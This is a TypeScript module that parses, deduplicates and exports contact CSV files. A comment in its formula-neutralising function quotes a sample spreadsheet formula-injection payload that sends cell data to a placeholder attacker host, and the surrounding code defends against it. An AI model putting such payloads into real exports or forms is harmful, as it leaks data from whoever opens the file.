/**
 * Client-side CSV handling for the contacts import/export.
 *
 * Import parses in the browser and POSTs JSON rows, so the server never has to
 * deal with CSV dialects.
 */

/**
 * parseCSV handles the messy realities of spreadsheet exports: quoted fields
 * containing commas, "" as an escaped quote, newlines inside quotes, a leading
 * UTF-8 BOM, and CRLF line endings.
 */
export function parseCSV(text: string): string[][] {
  // Excel writes a BOM; left in place it corrupts the first header name.
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);

  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;

  for (let i = 0; i < text.length; i++) {
    const char = text[i];

    if (inQuotes) {
      if (char === '"') {
        if (text[i + 1] === '"') {
          field += '"'; // "" is a literal quote.
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += char; // Newlines inside quotes are part of the value.
      }
      continue;
    }

    if (char === '"') {
      inQuotes = true;
    } else if (char === ",") {
      row.push(field);
      field = "";
    } else if (char === "\r") {
      // Swallow CR; the LF that follows ends the row.
    } else if (char === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else {
      field += char;
    }
  }

  // Flush a trailing row that isn't newline-terminated.
  if (field !== "" || row.length > 0) {
    row.push(field);
    rows.push(row);
  }

  return rows.filter((r) => r.some((cell) => cell.trim() !== ""));
}

/**
 * parseMoney turns human-typed currency into a number.
 * Handles "₹50,000", "50,000.50", "Rs. 1200", "" and other junk.
 */
export function parseMoney(raw: string): number {
  if (!raw) return 0;

  // Drop currency symbols, words, and spaces, then drop thousands separators.
  // "Rs. 1200" would otherwise leave ".1200" behind and parse as 0.12, so the
  // number is matched explicitly rather than by parseFloat-ing the remainder.
  const cleaned = raw.replace(/[^0-9.,-]/g, "").replace(/,/g, "");

  // Require a digit before any decimal point, so a stray leading "." is ignored.
  const match = cleaned.match(/-?\d+(?:\.\d+)?/);
  if (!match) return 0;

  const value = Number.parseFloat(match[0]);
  return Number.isFinite(value) ? value : 0;
}

export interface ParsedContact {
  name: string;
  phone: string;
  email: string;
  value: number;
  /**
   * The Stage cell as written in the file, when the file had a Stage column.
   *
   * A name, not an id, because that is what an export contains and what someone
   * editing the file by hand would type. Resolving it to a stage of the target
   * pipeline is the caller's job — only the caller knows which pipeline that is.
   */
  stageName?: string;
}

export interface ParseResult {
  rows: ParsedContact[];
  errors: { row: number; message: string }[];
  duplicatesInFile: number;
  /**
   * Whether the file had a Stage column.
   *
   * It changes what the stage picker means: with a Stage column it chooses where
   * unrecognised rows land, without one it chooses where everything lands. The
   * dialog has to say which, or one control silently means two things.
   */
  hasStageColumn: boolean;
}

/**
 * phoneKey reduces a phone number to something two spellings of it can share.
 *
 * Digits only, then the last ten, matching handlers.phoneKey on the server
 * exactly — the two halves of one duplicate rule, so a row counted as a
 * duplicate in the file is the same row the server would skip. Under seven
 * digits is not treated as a number, or half-filled cells collide with each
 * other and drop real rows.
 */
export function phoneKey(phone: string): string {
  const digits = phone.replace(/\D/g, "");
  if (digits.length < 7) return "";
  return digits.length > 10 ? digits.slice(-10) : digits;
}

/**
 * mapRows turns the raw grid into contact rows.
 *
 * A `name` column is required; phone/email/value are optional. Rows are deduped
 * within the file by email OR phone — the same rule the server applies against
 * the target pipeline. See handlers.dedupeKeys for why it is skip, not update.
 */
export function mapRows(grid: string[][]): ParseResult {
  const errors: ParseResult["errors"] = [];
  if (grid.length === 0) {
    return {
      rows: [],
      errors: [{ row: 0, message: "The file is empty" }],
      duplicatesInFile: 0,
      hasStageColumn: false,
    };
  }

  const header = grid[0].map((h) => h.trim().toLowerCase());
  const col = (...names: string[]) => {
    for (const n of names) {
      const idx = header.indexOf(n);
      if (idx !== -1) return idx;
    }
    return -1;
  };

  const nameIdx = col("name", "full name", "contact", "contact name");
  const phoneIdx = col("phone", "mobile", "phone number", "contact number");
  const emailIdx = col("email", "email address", "e-mail");
  const valueIdx = col("value", "amount", "deal value", "price");
  const stageIdx = col("stage", "stage name", "status", "column");

  if (nameIdx === -1) {
    return {
      rows: [],
      errors: [{ row: 1, message: 'A "name" column is required' }],
      duplicatesInFile: 0,
      hasStageColumn: false,
    };
  }

  const rows: ParsedContact[] = [];
  const seen = new Set<string>();
  let duplicatesInFile = 0;

  for (let i = 1; i < grid.length; i++) {
    // Report the row number the user sees in their spreadsheet.
    const rowNum = i + 1;
    const cells = grid[i];

    const name = (cells[nameIdx] ?? "").trim();
    if (!name) {
      errors.push({ row: rowNum, message: "Missing name" });
      continue;
    }

    const email = emailIdx === -1 ? "" : (cells[emailIdx] ?? "").trim();
    const phone = phoneIdx === -1 ? "" : (cells[phoneIdx] ?? "").trim();

    // Prefixed, because one set holds both kinds of key and a phone number in
    // an email column should not match the same digits in a phone column.
    const keys: string[] = [];
    if (email) keys.push(`e:${email.toLowerCase()}`);
    const pk = phoneKey(phone);
    if (pk) keys.push(`p:${pk}`);

    if (keys.some((k) => seen.has(k))) {
      duplicatesInFile++;
      continue;
    }
    for (const k of keys) seen.add(k);

    const stageName = stageIdx === -1 ? "" : (cells[stageIdx] ?? "").trim();

    rows.push({
      name,
      phone,
      email,
      value: valueIdx === -1 ? 0 : parseMoney((cells[valueIdx] ?? "").trim()),
      // Omitted rather than set empty, so "no stage given" is one state.
      ...(stageName ? { stageName } : {}),
    });
  }

  return { rows, errors, duplicatesInFile, hasStageColumn: stageIdx !== -1 };
}

/**
 * Characters that make Excel and Google Sheets treat a cell as a formula.
 *
 * TAB and CR are in the set because both begin a cell the same way once the file
 * has been parsed, and neither is visible in the source data.
 */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * Defuses a cell that a spreadsheet would execute rather than display.
 *
 * Not hypothetical here. Contact names arrive through the public form, which is
 * unauthenticated, so the value is attacker-chosen: a lead named
 * `=HYPERLINK("http://evil.example?x="&A1)` or a DDE payload runs on the machine
 * of whoever opens the export — the client, not the attacker. A QA pass submitted
 * a lead named `=1+1` and it came back as the first cell of the file.
 *
 * A leading apostrophe is the standard remedy: Excel and Sheets both read it as
 * "the rest is text" and do not render it. The value stays legible to anything
 * parsing the CSV as data, which is why this belongs here rather than in a
 * validation rule on the way in — the name is not the problem, executing it is.
 */
export function neutralizeFormula(value: string): string {
  return FORMULA_START.test(value) ? `'${value}` : value;
}

/**
 * toCSV builds a CSV file from the rows currently on screen.
 *
 * The BOM is required: without it Excel reads the file as ANSI and renders ₹ as
 * mojibake.
 */
export function toCSV(headers: string[], rows: (string | number)[][]): string {
  const escape = (v: string | number) => {
    const s = neutralizeFormula(String(v ?? ""));
    // Quote anything containing a delimiter, quote, or newline.
    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };

  const lines = [
    headers.map(escape).join(","),
    ...rows.map((r) => r.map(escape).join(",")),
  ];
  return "﻿" + lines.join("\r\n");
}

export function downloadCSV(filename: string, content: string) {
  const blob = new Blob([content], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}
